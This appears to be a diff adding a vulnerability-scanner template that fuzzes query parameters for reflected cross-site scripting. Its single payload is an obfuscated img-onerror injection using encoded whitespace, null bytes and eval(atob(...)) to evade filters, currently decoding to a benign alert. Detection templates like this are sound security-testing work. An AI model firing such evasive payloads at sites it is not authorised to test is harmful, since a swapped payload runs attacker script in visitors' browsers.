@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-payload
+
+info:
+  name: Custom Reflection XSS Payload Detection
+  author: netbaan
+  severity: high
+  description: |
+    This template tests for reflection XSS vulnerabilities using a specific payload that may include various encoded characters.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "<img%09'%0asrc='%5c%0d%7c'%00=''onerror=%0d%09%0a%60%60.sup(eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==')))>"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
